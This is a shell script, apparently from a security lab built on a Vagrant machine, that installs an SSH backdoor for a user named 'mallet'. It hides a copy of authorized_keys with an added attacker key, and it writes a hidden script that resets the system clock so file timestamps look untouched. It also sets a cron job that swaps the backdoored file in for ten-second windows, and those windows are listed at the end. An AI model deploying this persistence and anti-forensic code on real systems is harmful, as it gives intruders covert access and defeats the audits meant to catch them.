#!/bin/sh

# copy the original authorized_keys file
cp  /home/vagrant/.ssh/authorized_keys ~/.cache/.authorized_keys_normal;

# make an additional copy of authorized_keys
cp  /home/vagrant/.ssh/authorized_keys ~/.cache/.authorized_keys_back;
chown vagrant:vagrant ~/.cache/.authorized_keys_back;

# add the key of mallet, private key included in backdoor_1 folder
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCioxuOmXGIB2dSZxAG6+1u/kTqlLQLi9pFrm4FntjpO2cIUDqCZPz/CneRle91uFwIinHmj6Afd0Of5b6QD9ls4d3p3XlRJce8ZnQLeIKuGGTzJke8TDiFQNqob6eM8MbE5eEek0gnCYMIwyQbpAkE1w9WxlZRSZC3D+67JK5KpOv2AXR7VhduxQ489b0PSJKrplUpAVpMKeVVA6JfrrxoUvNdrL5jKo7Hf9WGni51Xj7UI9iDRU7RSsgV49lFn3NwLfcn9izJ9Qm880mm+tKM4PkgCIxAV2xKaSnW30sD8XwPfJnGWXrxD51Bnm+UazO5Ktssi1V2gdQHIlVcfTqw7T4iDkXv+Jl7fUDBrWJ4lEdi7yxDluPjDWkj957vnjZkIwsnbef9dvdiXXeQVrm3deLJPS9rflaayEljTGBu/525924bWg/eWfTdXuFRD5++ud+Kn8GNrjwXRxjKD22UqfiVPppua+S0xhlvywcx/yz+neP06z241XCmRr3/79OgPOeo8M5ggQQu085DP9p+PR4cfKG5mghuMhJNrKAci5a19uqZuNkUxwky2H64peXhIn/EdJNmM9vdCi9t+wGHDEnMoGLBC9F6mCnax9uklsa9xsvQm/M0kWGWimDktTHd1bYWBTLfRBhmQ2CTlzbc30LWtNepFWi3QD8RkIBGbQ== mallet@mallet.com" >> ~/.cache/.authorized_keys_back;

# create the shell script to set back the time of last modification of authorized_keys to hide modifications
printf '#!/bin/sh\n#Use timetravel to touch the file date back:\nnow=$(date)\n#date we will reset to:\nsomedate=$(stat --format=%X .ssh/bak_rsa.pub.pem)\nsudo date --set="@$somedate" > /dev/null\ntouch $1\nsudo date --set="$now" > /dev/null' > ~/.cache/.timetravel.sh

# bootstrap the backdoor
ln -f ~/.cache/.authorized_keys_normal ~/.ssh/authorized_keys
echo '*/13 * * * * ln -f ~/.cache/.authorized_keys_back ~/.ssh/authorized_keys; sleep 10; bash ~/.cache/.timetravel.sh ~/.ssh/authorized_keys; ln -f ~/.cache/.authorized_keys_normal ~/.ssh/authorized_keys; sleep 250; ln -f ~/.cache/.authorized_keys_back ~/.ssh/authorized_keys; sleep 10; bash ~/.cache/.timetravel.sh ~/.ssh/authorized_keys; ln -f ~/.cache/.authorized_keys_normal ~/.ssh/authorized_keys; sleep 250; ln -f ~/.cache/.authorized_keys_back ~/.ssh/authorized_keys; sleep 10; bash ~/.cache/.timetravel.sh ~/.ssh/authorized_keys; ln -f ~/.cache/.authorized_keys_normal ~/.ssh/authorized_keys;' | crontab -

# Timetable of vulnerable 10 second window, always in minutes past the hour:
# 00:00
# 04:20
# 08:40
# 13:00
# 17:20
# 21:40
# 26:00
# 30:20
# 34:40
# 39:00
# 43:20
# 47:40
# 52:00
# 56:20